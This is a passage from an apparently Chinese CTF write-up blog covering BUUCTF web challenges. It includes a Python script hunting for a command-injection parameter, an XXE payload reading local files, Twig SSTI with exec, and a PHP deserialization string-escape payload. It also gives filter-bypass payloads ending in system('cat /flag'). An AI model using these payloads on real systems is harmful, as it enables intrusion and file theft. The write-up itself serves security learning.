class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:									<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:													<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:															<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

![image-20220511230010227](./buu/image-20220511230010227.png)

我们访问
`/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag`得到`flag`

![image-20220511230107955](./buu/image-20220511230107955.png)

## [NCTF2019]Fake XML cookbook

考查的地方：[XML](https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020)实体注入漏洞，远程文件读取（XXE）

[浅谈XML实体注入漏洞](https://www.freebuf.com/vuls/175451.html) 

[先知社区XXE](https://xz.aliyun.com/t/6887#toc-5)

![image-20220511234432734](./buu/image-20220511234432734.png)

抓包分析：

![image-20220511234617028](./buu/image-20220511234617028.png)

这里用的是外部实体远程文件读取那个地方的知识点，根据上面的抓包信息，我们可以知道页面以POST形式传输了XML数据，既然是XML数据，我们就可以自己新增一个恶意外部实体然后在原本的XML数据中进行实体调用，来进行XXE攻击，如下：

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span>  &lt;--可以不要&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

![image-20220511235751488](./buu/image-20220511235751488.png)

**payload解释：**

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。</span><br><span class="line">standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</span><br><span class="line">按实体有无参分类，实体分为一般实体和参数实体，一般实体的声明：<span class="meta">&lt;!ENTITY 实体名称 <span class="meta-string">&quot;实体内容&quot;</span>&gt;</span>，引用一般实体的方法：&amp;实体名称;</span><br><span class="line">外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机。</span><br><span class="line">因为将file:///flag命名为admin，所以下面用&amp;admin。</span><br><span class="line">PHP引用外部实体，常见的利用协议：</span><br><span class="line">file://文件绝对路径 如：file:///etc/passwd</span><br></pre></td></tr></table></figure>

## [BJDCTF2020]Cookie is so stable

![image-20220513215832915](./buu/image-20220513215832915.png)

一开始看到题目提示cookie 先抓一个包试试

![image-20220513215923652](./buu/image-20220513215923652.png)

flag..php感觉是注入的题目，但是[sql注入](https://so.csdn.net/so/search?q=sql注入&spm=1001.2101.3001.7020)没啥反应。但是你输入什么他就会回显什么

![image-20220513215942483](./buu/image-20220513215942483.png)

抓包分析hint.php，既然是hint.php，那就肯定会有线索，如下，提示我们注意看cookie

![image-20220513220028569](./buu/image-20220513220028569.png)

所以回到flag.php,先输入admin，然后登录，回显

**在登录的状态下**，刷新flag.php，进行抓包

![image-20220513220102072](./buu/image-20220513220102072.png)

**尝试&#123;&#123;7\*7&#125;&#125;, 返回49**

**尝试&#123;&#123;7\*'7'&#125;&#125;,返回49,说明是Twig模板，但是如果返回7777777，则说明是Jinia2模板**

**本题是Twig模板**

[一篇文章带你理解漏洞之SSTI漏洞/#2-Twig](https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/#2-Twig)

**payload:**

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.getFilter(<span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">payload:&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

![image-20220513220856316](./buu/image-20220513220856316.png)

发现不是在这里绕过，我们抓取一个登录的包

![image-20220513221041897](./buu/image-20220513221041897.png)

##  [WUSTCTF2020]朴实无华

考察点：三重绕过，intval()函数进行科学计数法的绕过，[md5](https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020)碰撞，命令执行，php绕过过滤空格

![image-20220514214755142](./buu/image-20220514214755142.png)

利用点bot，想到robots.txt网站的爬虫规则

![image-20220514215001996](./buu/image-20220514215001996.png)

flag&#123;this_is_not_flag&#125;

响应包：![image-20220514215127437](./buu/image-20220514215127437.png)

/f14g.php,得到源码：![image-20220514215304442](./buu/image-20220514215304442.png)

（1）level1

    //level 1
    if (isset($_GET['num']))&#123;
        $num = $_GET['num'];
        if(intval($num) < 2020 && intval($num + 1) > 2021)&#123;//需要$num小于2020但是+1之后大于2021
            echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.<br>";
        &#125;else&#123;
            die("金钱解决不了穷人的本质问题");
        &#125;
    &#125;else&#123;
        die("去非洲吧");
    &#125; 
**intval()** 函数用于获取变量的整数值。![image-20220514215454056](./buu/image-20220514215454056.png)

所以对字符串2e4，intval()函数只会讲其中的2给提取出来，也就是2。

我们知道php还有个强制转换的机制，如果我们将一个字符串和一个数字相加，首先php会将字符串转换成数字，然后将两个数字相加。

而2e4字符串转换成数字是浮点数20000，然后再加0就是浮点数20001，再intval将整数部分提取出来，就是(int)20001。所以可以进行绕过。
(2) level2

    //level 2
    if (isset($_GET['md5']))&#123;
       $md5=$_GET['md5'];
       if ($md5==md5($md5))     //需要找到一个字符串满足它本身和它的md5编码值弱比较相同
           echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.<br>";
       else
           die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
    &#125;else&#123;
        die("去非洲吧");
    &#125;

看到==，就想到了php弱比较，php会将以0e开头的字符串，当进行==弱比较时，会认为是相同的。php把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。

所以就变成了找到一个以0e开头的字符串s,并且md5(s)也是以0x开头的字符串。**0e215962017**


(3) get flag

    //get flag
    if (isset($_GET['get_flag']))&#123;
        $get_flag = $_GET['get_flag'];
        if(!strstr($get_flag," "))&#123;     //就是说当$get_flag中没有空格（ ）的时候，执行下面的语句 
            $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
            echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.<br>";
            system($get_flag);
        &#125;else&#123;
            die("快到非洲了");
        &#125;
    &#125;else&#123;
        die("去非洲吧");
    &#125;
    
    strstr() 函数搜索字符串在另一字符串中的第一次出现，并且返回字符串的剩余部分。如果找不到要找的字符串，则返回false.
    
    str_ireplace() 函数替换字符串中的一些字符（不区分大小写）。
**我们需要传入的$get_flag，不存在空格，并且cat也会被替代为wctf2020，然后才会执行$get_flag。**

先试试传入ls,查看目录文件![image-20220514220107738](./buu/image-20220514220107738.png)

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">payload</span>:/fl<span class="number">4</span>g.php?num=<span class="number">2</span>e<span class="number">4</span>&amp;md<span class="number">5</span>=<span class="number">0</span>e<span class="number">215962017</span>&amp;get_flag=tac<span class="variable">$&#123;IFS&#125;</span>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>

## [安洵杯 2019]easy_serialize_php

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;<span class="comment">//是一个过滤器，把符合filter_arr里面的字符替换为空（满足字符串逃逸的条件）</span></span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);<span class="comment">//把$_SESSION重置为空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);<span class="comment">//这里就用了变量覆盖的知识</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));<span class="comment">//把序列化后的$_SESSION用filter函数过滤</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

知识点：反序列化字符串逃逸。extract()变量覆盖

$_SESSION是访客与整个网站交互过程中一直存在的公有变量。

 extract($_POST)就是将post的内容作为这个函数的参数。

然后就是变量覆盖。**如果post传参为`_SESSION[flag]=123`，那么`$_SESSION["user"]`和`$_SESSION["function"]`的值都会被覆盖**。

至于为什么post要传`_SESSION[flag]=123`而不是`$_SESSION[flag]=123`，是因为`_SESSION`是变量名，如果传`$_SESSION`，那么就会失效。

先?f=phpinfo看看能找到什么东西。

![image-20220514222327568](./buu/image-20220514222327568.png)

flag在/d0g3_fllllllag里面，所以再读/d0g3_fllllllag。

所以就有可能要通过最后一个语句来打开查看这个文件。

如果直接进行变量覆盖，直接给$SESSION['img']一个预想的值是不现实的，

因为$SESSION['img'] = base64_encode('guest_img.png')是在**extract($_POST);**这个函数之后执行的。

    if(!$_GET['img_path'])&#123;
        $_SESSION['img'] = base64_encode('guest_img.png');
    &#125;else&#123;
        $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
    &#125;

**所以我们看看另一个方向：fileter函数**

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#这部分代码就是将参数$img里面的跟上面数组里的字符串替换成空&#x27;&#x27;，然后返回替换之后的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

**php反序列化的对象逃逸**

任何具有一定结构的数据，只要经过了某些处理而把自身结构改变，则可能产生漏洞。

过滤函数分为两种情况：

**第一种为关键词数增加**

​		例如： where->hacker，这样词数由五个增加到6个。

**第二种为关键词数减少**

​		例如：直接过滤掉一些关键词，例如这道题目中。

​		过滤函数filter()是对serialize($_SESSION)进行过滤，滤掉一些关键字
 ​		那么我们有两种方法：

**键逃逸和值逃逸：**

原理:因为序列化后的字符串是严格的，对应的格式不能错，比如s:4:"name",那s:4就必须有一个字符串长度是4的否则就往后要。

并且unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。

示例：

<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;?</span>php</span><br><span class="line">#正规序列化的字符串</span><br><span class="line"><span class="variable">$a</span> <span class="operator">=</span> <span class="string">&quot;a:2:&#123;s:3:<span class="subst">\&quot;</span>one<span class="subst">\&quot;</span>;s:4:<span class="subst">\&quot;</span>flag<span class="subst">\&quot;</span>;s:3:<span class="subst">\&quot;</span>two<span class="subst">\&quot;</span>;s:4:<span class="subst">\&quot;</span>test<span class="subst">\&quot;</span>;&#125;&quot;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$a</span>));</span><br><span class="line">#带有多余的字符的字符串</span><br><span class="line"><span class="variable">$a_laji</span> <span class="operator">=</span> <span class="string">&quot;a:2:&#123;s:3:<span class="subst">\&quot;</span>one<span class="subst">\&quot;</span>;s:4:<span class="subst">\&quot;</span>flag<span class="subst">\&quot;</span>;s:3:<span class="subst">\&quot;</span>two<span class="subst">\&quot;</span>;s:4:<span class="subst">\&quot;</span>test<span class="subst">\&quot;</span>;&#125;;s:3:<span class="subst">\&quot;</span>真的垃圾img<span class="subst">\&quot;</span>;lajilaji&quot;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$a_laji</span>));</span><br><span class="line"># <span class="string">&quot;;s:3:<span class="subst">\&quot;</span>真的垃圾img<span class="subst">\&quot;</span>;lajilaji&quot;</span>;<span class="string">&quot;这些会被扔掉</span></span><br></pre></td></tr></table></figure>

如果我们把

$_SESSION['img'] = base64_encode('guest_img.png');这段代码的img属性放到花括号外边去，

然后花括号中注好新的img属性，那么他本来要求的img属性就被咱们替换了。

那如何达到这个目的就要通过过滤函数了，因为咱的序列化的是个字符串啊，然后他又把黑名单的东西替换成空。

**键逃逸payload：**

这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对

 因为我们要让img的内容为d0g3_f1ag.phpbase64编码后的字符串，所以要传_SESSION[img]=;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;

因为在变量覆盖后面，又重新给$_SESSION[img]赋值了，失败，所以这个时候就要使用filter函数了，

如果我们传的是_SESSION[imgphp]=;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;

那么得到的是![image-20220514225026442](./buu/image-20220514225026442.png)

让s:6读取黄字部分

a:2:&#123;s:6:"img";s:40:";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";&#125;"

这样不就可以让后面的s:3:"img";s:20:"ZDBnM19mMWFnLnBocA=="生效了吗？但是后面字符是10个，所以再加一个flag，构造为前面是10

我们试试构造一下，我们进行反序列化看看。

    <?php
    $a=unserialize('a:2:&#123;s:10:"img";s:40:";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";&#125;');
    print_r($a);
失败了：前面的a:2那里，如果我们这样构造的话，序列化内容就不满足a:2了。（即有两个元素）

前面加上：s:3:"123"

_SESSION[imgphpflag]=;s:3:"123";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;

得到：a:2:&#123;s:10:"img";s:50:";s:3:"123";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";&#125;

post:_SESSION[imgphpflag]=;s:3:"123";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;

得到：![image-20220514230536914](./buu/image-20220514230536914.png)

将这个base64:刚好还是20个:

![image-20220514230718452](./buu/image-20220514230718452.png)

## [ASIS 2019]Unicorn shop

知识点：Unicode欺骗

[unicode](https://www.compart.com/en/unicode)

输入前三个的Item ID会提示`Wrong commodity!`，如果Price输入超过一个字符会提示Only `one char(?) allowed!`。那这道题就是要尝试用一个字符来表示超过1377的数

![image-20220517130040487](./buu/image-20220517130040487.png)

![image-20220517130231163](buu/image-20220517130231163.png)

随便找一个超过1337的数

![image-20220517130302134](./buu/image-20220517130302134.png)

![image-20220517130315766](./buu/image-20220517130315766.png)

由于这题使用的是utf-8![image-20220517130342368](./buu/image-20220517130342368.png)

所以是：0xE2 0x86 0x82，还要把0x改成%

payload：%E2%86%82

## [CISCN 2019 初赛]Love Math

![image-20220517132652969](./buu/image-20220517132652969.png)

代码讲的意思是传入一个参数c长度不能大于等于80，然后有黑名单字符过滤，有白名单函数过滤

php中可以把函数名通过[字符串](https://so.csdn.net/so/search?q=字符串&spm=1001.2101.3001.7020)的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);

$a='system';
$a('ls');

<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">题目中有长度限制我们可以尝试构造<span class="symbol">$</span>_GET[]然后在传入想用的<span class="built_in">exp</span>，但是这里把中括号下划线禁用了，那么就得需要编码绕过了。</span><br><span class="line">通过白名单我们看到了一些可能帮助我们编码绕过的函数 base_convert ，dechex，第一个可以进行进制之间的转换，比如 base_convert(<span class="string">&quot;1001&quot;</span><span class="number">2</span>,<span class="number">10</span>)是将二进制的<span class="number">1001</span>转换为<span class="number">10</span>进制，第二个函数是将<span class="number">10</span>进制转成<span class="number">16</span>进制。</span><br><span class="line">我们先来写下我们要构造的payload：</span><br><span class="line"></span><br><span class="line">?c=<span class="symbol">$</span>_GET[a](<span class="symbol">$</span>_GET[b])&amp;a=<span class="keyword">system</span>&amp;b=cat flag</span><br><span class="line"></span><br><span class="line">好了，目的明确了，中括号被禁用我们可以用花括号代替&#123;&#125;，要构造的字符串为 _GET,php中有将<span class="number">16</span>进制转成字符串的函数hex2bin，那么hex2bin又怎么生成呢，这时就需要我们的base_convert函数了，<span class="number">36</span>进制也就是base36中有字母数字正好可以满足。</span><br><span class="line">所以 base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)=hex2bin。因为我们是要得到_GET所以就得用到另外一个函数dechex将_GET的<span class="number">10</span>进制转为<span class="number">16</span>进制再通过hex2bin转换为字符串</span><br><span class="line">所以_GET=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));</span><br><span class="line">好了我们已经可以构造出<span class="symbol">$</span>_GET[]了，那么直接将上面的payload修改下即可</span><br><span class="line"></span><br><span class="line">c=<span class="symbol">$</span><span class="built_in">pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>&#123;<span class="built_in">pi</span>&#125;(<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>&#123;<span class="built_in">abs</span>&#125;)&amp;<span class="built_in">pi</span>=<span class="keyword">system</span>&amp;<span class="built_in">abs</span>=cat /flag</span><br><span class="line"></span><br></pre></td></tr></table>

## [WesternCTF2018]shrine

打开网站，查看源码看到下面的一串代码

> import flask//flask模板，首先就想到了想到了之前我写的一篇flask模板ssti逃逸
>
> import os
>
> app = flask.Flask(__name__)
>
> app.config['FLAG'] = os.environ.pop('FLAG')//注册了一个名为FLAG的config，这里基本可以确定是flag。
>
> @app.route('/')
>
> def index():
>
>   return open(__file__).read()
>
> @app.route('/shrine/<path:shrine>')//这里设置了shrine路由，这里可能会实现ssti
>
> def shrine(shrine):
>
>   def safe_jinja(s)://jinja模板
>
> ​    s = s.replace('(', '').replace(')', '')
>
> ​    blacklist = ['config', 'self']//设置黑名单
>
> ​    return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist]) + s//把黑名单的东西遍历并设为空
>
>   return flask.render_template_string(safe_jinja(shrine))//进行模块渲染
>
> if __name__ == '__main__':
>
>   app.run(debug=True)

根据源码就有了大致的思路就是在shrine目录下利用ssti漏洞，首先测试一下行不行。试一个经典&#123;&#123;7*7&#125;&#125;，发现可以

![image-20220517135009073](./buu/image-20220517135009073.png)

config 是 Flask模版中的一个全局对象,它包含了所有应用程序的配置值

接下来就可以考虑在shrine下直接&#123;&#123;config&#125;&#125;即可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号，但是python还有一个函数叫做url_for，其作用是url是用于构建指定函数的URL，在配合**globals()**，该函数会以字典类型返回当前位置的全部全局变量。这样也可以实现查看的效果

